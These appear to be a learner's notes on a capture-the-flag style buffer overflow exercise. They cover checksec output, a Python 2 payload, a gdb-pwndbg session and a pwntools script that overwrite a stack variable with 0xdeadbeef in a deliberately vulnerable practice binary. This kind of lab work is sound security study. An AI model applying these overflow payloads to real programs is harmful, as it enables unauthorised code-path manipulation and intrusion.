note to self: pwn tools is installed in the venv. 
### Overwriting stack variables 2 

file:
```
overwrite: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=094cbdd4694e5f4aeb958401302aadc77be2c5f0, for GNU/Linux 3.2.0, not stripped
```

checksec:
```
└─$ checksec --file=overwrite
- Partial RELRO
- NO Stack canary 
- NX disabled 
- NO pie 

```


#### Manual exploit with python: NEEDS TO BE PYTHON 2
```
payload = 'A'*32+"\xef\xbe\xad\xde"
file = open("payload", "w")
file.write(payload)

print(payload)
```

- Work in python2 since `'A'*32+"\xef\xbe\xad\xde"` is considered raw bytes, in python3 its considered a string. 


This payload we can send to the file:
```
└─$ ./overwrite < payload
yes? good job!!
deadbeef
```


#### Using gdb-pwndbg: 

From ghidra we find a place where we compare the input of the users to a hex value. We take this memory address and set a breakpoint:
`break *0x080491e0`

```
Running it we stop at the breakpoint, and check the compare statement:
cmp dword ptr [ebp - 0xc], 0xdeadbeef 

We want this to be true, so we check the actual value in the memory location:

pwndbg> x $ebp - 0xc
0xffffcfdc:     0x12345678

And we can see its not equal to 0xdeadbeef. 


We could set it to decired value manually:
pwndbg> set *0xffffcfdc = 0xdeadbeef
pwndbg> x $ebp - 0xc
0xffffcfdc:     0xdeadbeef

If we run continue, we get the decired result. 
```

- Note this would be "cheating" since we could not exploit this program running on a server with this approach. 


#### Using Pwn Tools:
```
└─$ cat exploit.py
from pwn import *

# Start program
io = process('./overwrite')

# Send string to overflow buffer
io.sendlineafter(b'?', b'A' * 32 + p32(0xdeadbeef))

# Receive output
print(io.recvall().decode())
```

- Start our program as a process
- After we are prompted with a '?' we send 32 As and 0xdeadbeef packed for a ?32 bit program?
- Then we print the output and decode it to readable format. 